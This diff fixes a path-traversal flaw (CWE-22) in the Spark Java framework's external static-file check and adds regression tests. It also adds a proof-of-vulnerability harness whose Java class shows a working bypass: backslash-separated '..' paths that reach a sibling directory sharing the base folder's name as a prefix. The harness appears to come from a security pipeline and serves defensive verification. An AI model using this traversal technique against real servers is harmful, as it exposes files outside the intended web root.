@@ -1,0 +1,258 @@
+diff --git a/src/main/java/spark/staticfiles/DirectoryTraversal.java b/src/main/java/spark/staticfiles/DirectoryTraversal.java
+index 080fbe4..bcad2a0 100644
+--- a/src/main/java/spark/staticfiles/DirectoryTraversal.java
++++ b/src/main/java/spark/staticfiles/DirectoryTraversal.java
+@@ -10,18 +10,31 @@ import static spark.utils.StringUtils.removeLeadingAndTrailingSlashesFrom;
+ public class DirectoryTraversal {
+ 
+     public static void protectAgainstInClassPath(String path) {
+-        if (!removeLeadingAndTrailingSlashesFrom(path).startsWith(StaticFilesFolder.local())) {
++        if (!isWithin(removeLeadingAndTrailingSlashesFrom(path), StaticFilesFolder.local())) {
+             throw new DirectoryTraversalDetection("classpath");
+         }
+     }
+ 
+     public static void protectAgainstForExternal(String path) {
+         String nixLikePath = Paths.get(path).toAbsolutePath().toString().replace("\\", "/");
+-        if (!removeLeadingAndTrailingSlashesFrom(nixLikePath).startsWith(StaticFilesFolder.external())) {
++        if (!isWithin(removeLeadingAndTrailingSlashesFrom(nixLikePath), StaticFilesFolder.external())) {
+             throw new DirectoryTraversalDetection("external");
+         }
+     }
+ 
++    /**
++     * Checks that the resolved path is the configured folder itself or a descendant of it,
++     * enforcing a path-segment boundary so that a sibling directory sharing the configured
++     * folder's name as a prefix (e.g. "base" vs "base_secret") cannot escape the folder.
++     */
++    private static boolean isWithin(String resolvedPath, String configuredFolder) {
++        if (configuredFolder == null) {
++            return false;
++        }
++        return resolvedPath.equals(configuredFolder)
++                || resolvedPath.startsWith(configuredFolder + "/");
++    }
++
+     public static final class DirectoryTraversalDetection extends RuntimeException {
+         private static final long serialVersionUID = 1L;
+ 
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..8696c3e
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/org/slf4j/slf4j-api/1.7.13/slf4j-api-1.7.13.jar:/root/.m2/repository/org/slf4j/slf4j-simple/1.7.13/slf4j-simple-1.7.13.jar:/root/.m2/repository/org/eclipse/jetty/jetty-server/9.4.6.v20170531/jetty-server-9.4.6.v20170531.jar:/root/.m2/repository/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:/root/.m2/repository/org/eclipse/jetty/jetty-http/9.4.6.v20170531/jetty-http-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-io/9.4.6.v20170531/jetty-io-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-webapp/9.4.6.v20170531/jetty-webapp-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-xml/9.4.6.v20170531/jetty-xml-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-servlet/9.4.6.v20170531/jetty-servlet-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-security/9.4.6.v20170531/jetty-security-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/websocket/websocket-server/9.4.6.v20170531/websocket-server-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/websocket/websocket-common/9.4.6.v20170531/websocket-common-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/websocket/websocket-servlet/9.4.6.v20170531/websocket-servlet-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/websocket/websocket-api/9.4.6.v20170531/websocket-api-9.4.6.v20170531.jar:/root/.m2/repository/junit/junit/4.12/junit-4.12.jar:/root/.m2/repository/org/hamcrest/hamcrest-core/1.3/hamcrest-core-1.3.jar:/root/.m2/repository/org/mockito/mockito-core/1.10.19/mockito-core-1.10.19.jar:/root/.m2/repository/org/objenesis/objenesis/2.1/objenesis-2.1.jar:/root/.m2/repository/org/powermock/powermock-module-junit4/1.6.6/powermock-module-junit4-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-module-junit4-common/1.6.6/powermock-module-junit4-common-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-reflect/1.6.6/powermock-reflect-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-api-mockito/1.6.6/powermock-api-mockito-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-api-mockito-common/1.6.6/powermock-api-mockito-common-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-api-support/1.6.6/powermock-api-support-1.6.6.jar:/root/.m2/repository/org/apache/httpcomponents/httpclient/4.5.1/httpclient-4.5.1.jar:/root/.m2/repository/org/apache/httpcomponents/httpcore/4.4.3/httpcore-4.4.3.jar:/root/.m2/repository/commons-logging/commons-logging/1.2/commons-logging-1.2.jar:/root/.m2/repository/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:/root/.m2/repository/org/freemarker/freemarker/2.3.23/freemarker-2.3.23.jar:/root/.m2/repository/com/google/code/gson/gson/2.4/gson-2.4.jar:/root/.m2/repository/org/eclipse/jetty/websocket/websocket-client/9.4.6.v20170531/websocket-client-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-util/9.4.6.v20170531/jetty-util-9.4.6.v20170531.jar:/root/.m2/repository/org/eclipse/jetty/jetty-client/9.4.6.v20170531/jetty-client-9.4.6.v20170531.jar:/root/.m2/repository/org/powermock/tests/powermock-tests-utils/1.6.6/powermock-tests-utils-1.6.6.jar:/root/.m2/repository/org/powermock/powermock-core/1.6.6/powermock-core-1.6.6.jar:/root/.m2/repository/org/javassist/javassist/3.21.0-GA/javassist-3.21.0-GA.jar:/root/.m2/repository/javax/servlet/servlet-api/2.5/servlet-api-2.5.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/out/spark/resource/ExternalStaticFilesTraversalPoV.class b/.security-pipeline/pov/out/spark/resource/ExternalStaticFilesTraversalPoV.class
+new file mode 100644
+index 0000000..d692854
+Binary files /dev/null and b/.security-pipeline/pov/out/spark/resource/ExternalStaticFilesTraversalPoV.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..9181b54
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,22 @@
++#!/usr/bin/env bash
++# Proof-of-Vulnerability runner for finding-278ac32699a6 (CWE-022 path traversal
++# in Spark external static files). Must be executed inside /workspace/repo in the
++# project container. Exits 0 when the vulnerability reproduces, non-zero otherwise.
++set -euo pipefail
++
++POV_DIR=".security-pipeline/pov"
++OUT_DIR="${POV_DIR}/out"
++CP_FILE="${POV_DIR}/cp.txt"
++
++# Build product classes (skip tests) and resolve the dependency classpath.
++mvn -B -q -DskipTests package
++mvn -B -q dependency:build-classpath -Dmdep.outputFile="${CP_FILE}"
++
++CP="target/classes:$(cat "${CP_FILE}")"
++
++rm -rf "${OUT_DIR}"
++mkdir -p "${OUT_DIR}"
++javac -cp "${CP}" -d "${OUT_DIR}" \
++  "${POV_DIR}/spark/resource/ExternalStaticFilesTraversalPoV.java"
++
++java -cp "${CP}:${OUT_DIR}" spark.resource.ExternalStaticFilesTraversalPoV
+diff --git a/.security-pipeline/pov/spark/resource/ExternalStaticFilesTraversalPoV.java b/.security-pipeline/pov/spark/resource/ExternalStaticFilesTraversalPoV.java
+new file mode 100644
+index 0000000..1cc40cd
+--- /dev/null
++++ b/.security-pipeline/pov/spark/resource/ExternalStaticFilesTraversalPoV.java
+@@ -0,0 +1,121 @@
++package spark.resource;
++
++import java.io.BufferedReader;
++import java.io.File;
++import java.io.FileReader;
++import java.io.FileWriter;
++
++import spark.staticfiles.DirectoryTraversal;
++import spark.staticfiles.StaticFilesFolder;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Spark's external
++ * static files handling.
++ *
++ * Root cause: {@link spark.staticfiles.DirectoryTraversal#protectAgainstForExternal(String)}
++ * validates the resolved file path with a bare {@code String.startsWith(...)} against
++ * the configured external folder, WITHOUT a path-separator boundary. A sibling
++ * directory whose name merely shares the configured folder's name as a prefix
++ * (e.g. base "/tmp/pov_ext_base" vs sibling "/tmp/pov_ext_base_secret") therefore
++ * passes the check.
++ *
++ * The traversal itself survives {@link UriPath#canonical(String)} because the
++ * attacker uses backslash separators: {@code canonical(...)} only understands '/'
++ * so it does not collapse the "..", and the backslashes are later turned into '/'
++ * by {@link spark.utils.StringUtils#cleanPath(String)} inside {@link ExternalResource},
++ * producing a real filesystem traversal.
++ *
++ * This class lives in package spark.resource so it can drive the exact same
++ * vulnerable code path the framework uses when serving an external static file:
++ *   ExternalResourceHandler.getResource(path)
++ *     -> UriPath.canonical(path)
++ *     -> AbstractResourceHandler.addPaths(base, path)
++ *     -> new ExternalResource(...) -> StringUtils.cleanPath (\ -> /)
++ *     -> DirectoryTraversal.protectAgainstForExternal(resolvedPath)   // flawed check
++ *     -> resource.getFile()                                           // file outside base
++ *
++ * Exit code contract:
++ *   - exit 0  => the vulnerability reproduced (a file OUTSIDE the configured
++ *                external static folder was served).
++ *   - exit 1  => the attack was blocked (patched behaviour).
++ */
++public class ExternalStaticFilesTraversalPoV {
++
++    private static final String SECRET_MARKER = "TOP_SECRET_OUTSIDE_STATIC_ROOT";
++
++    public static void main(String[] args) throws Exception {
++        File tmp = new File(System.getProperty("java.io.tmpdir"));
++
++        // Configured external static files folder (the ONLY directory that should be reachable).
++        File baseFolder = new File(tmp, "pov_ext_base");
++        baseFolder.mkdirs();
++        writeFile(new File(baseFolder, "index.html"), "public content");
++
++        // A sibling directory whose name shares the base folder's name as a prefix.
++        // This is what defeats the boundary-less startsWith() check.
++        File siblingFolder = new File(tmp, "pov_ext_base_secret");
++        siblingFolder.mkdirs();
++        File secretFile = new File(siblingFolder, "secret.txt");
++        writeFile(secretFile, SECRET_MARKER);
++
++        String basePath = baseFolder.getAbsolutePath();
++
++        // Configure the framework exactly like StaticFilesConfiguration.configureExternal() does.
++        StaticFilesFolder.externalConfiguredTo(basePath);
++        ExternalResourceHandler handler = new ExternalResourceHandler(basePath, "index.html");
++
++        // Attacker-controlled request path. Uses backslash separators so that
++        // UriPath.canonical() does not neutralise the "..". After a URL-decode in a
++        // real request this is what the servlet layer would hand to getResource().
++        String attackPath = "/.." + "\\" + siblingFolder.getName() + "\\secret.txt";
++        System.out.println("[pov] configured external folder : " + basePath);
++        System.out.println("[pov] StaticFilesFolder.external(): " + StaticFilesFolder.external());
++        System.out.println("[pov] attack request path        : " + attackPath);
++
++        AbstractFileResolvingResource resource;
++        try {
++            resource = handler.getResource(attackPath);
++        } catch (DirectoryTraversal.DirectoryTraversalDetection blocked) {
++            System.out.println("[pov] BLOCKED: traversal detected -> " + blocked.getMessage());
++            System.exit(1);
++            return;
++        }
++
++        if (resource == null) {
++            System.out.println("[pov] BLOCKED: handler returned null (no resource served).");
++            System.exit(1);
++            return;
++        }
++
++        File served = resource.getFile();
++        String servedCanonical = served.getCanonicalPath();
++        String baseCanonical = baseFolder.getCanonicalPath();
++
++        boolean escapesBase = !servedCanonical.equals(baseCanonical)
++                && !servedCanonical.startsWith(baseCanonical + File.separator);
++
++        String content;
++        try (BufferedReader r = new BufferedReader(new FileReader(served))) {
++            content = r.readLine();
++        }
++
++        System.out.println("[pov] served file                : " + servedCanonical);
++        System.out.println("[pov] served content             : " + content);
++        System.out.println("[pov] escapes configured folder  : " + escapesBase);
++
++        if (escapesBase && SECRET_MARKER.equals(content)) {
++            System.out.println("[pov] VULNERABLE: read a file OUTSIDE the external static folder "
++                    + "via path traversal (CWE-022).");
++            System.exit(0);
++        }
++
++        System.out.println("[pov] Not exploited: served file did not escape the configured folder.");
++        System.exit(1);
++    }
++
++    private static void writeFile(File f, String content) throws Exception {
++        try (FileWriter w = new FileWriter(f)) {
++            w.write(content);
++        }
++    }
++}
+diff --git a/src/test/java/spark/staticfiles/DirectoryTraversalTest.java b/src/test/java/spark/staticfiles/DirectoryTraversalTest.java
+new file mode 100644
+index 0000000..05fd03f
+--- /dev/null
++++ b/src/test/java/spark/staticfiles/DirectoryTraversalTest.java
+@@ -0,0 +1,47 @@
++package spark.staticfiles;
++
++import org.junit.Test;
++
++import java.io.File;
++import java.nio.file.Files;
++import java.nio.file.Path;
++
++import static org.junit.Assert.assertTrue;
++import static org.junit.Assert.fail;
++
++/**
++ * Regression tests for {@link DirectoryTraversal} ensuring the external static files
++ * folder boundary check rejects sibling directories that merely share the configured
++ * folder's name as a prefix (CWE-022 path traversal).
++ */
++public class DirectoryTraversalTest {
++
++    @Test
++    public void siblingDirectorySharingPrefixIsRejected() throws Exception {
++        Path base = Files.createTempDirectory("dt_base");
++        // Sibling directory whose absolute path starts with the configured folder's path.
++        File sibling = new File(base.toAbsolutePath() + "_secret");
++        assertTrue(sibling.mkdirs() || sibling.isDirectory());
++        File secret = new File(sibling, "secret.txt");
++
++        StaticFilesFolder.externalConfiguredTo(base.toAbsolutePath().toString());
++
++        try {
++            DirectoryTraversal.protectAgainstForExternal(secret.getAbsolutePath());
++            fail("Expected DirectoryTraversalDetection for path outside the configured folder");
++        } catch (DirectoryTraversal.DirectoryTraversalDetection expected) {
++            // expected
++        }
++    }
++
++    @Test
++    public void fileInsideConfiguredFolderIsAllowed() throws Exception {
++        Path base = Files.createTempDirectory("dt_base_allow");
++        File inside = new File(base.toFile(), "index.html");
++
++        StaticFilesFolder.externalConfiguredTo(base.toAbsolutePath().toString());
++
++        // Should not throw.
++        DirectoryTraversal.protectAgainstForExternal(inside.getAbsolutePath());
++    }
++}
